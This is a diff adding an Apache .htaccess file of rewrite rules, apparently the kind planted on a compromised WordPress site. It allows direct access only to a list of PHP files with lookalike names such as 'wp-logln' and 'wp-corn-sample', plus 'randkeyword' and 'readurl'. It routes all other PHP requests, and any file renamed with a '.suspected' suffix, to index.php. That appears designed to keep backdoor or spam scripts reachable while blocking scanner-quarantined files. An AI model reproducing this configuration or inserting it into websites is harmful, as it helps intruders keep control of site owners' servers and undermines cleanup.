@@ -1,0 +1,10 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^(index|wp\-admin|wp\-include|wp\-comment|wp\-loader|wp\-corn\-sample|wp\-logln|output|about|admin|randkeyword|readurl|wp\-ver).php$ - [L]
+RewriteRule ^.*\.[pP][hH].* index.php [L]
+RewriteRule ^.*\.[sS][uU][sS][pP][eE][cC][tT][eE][dD] index.php [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
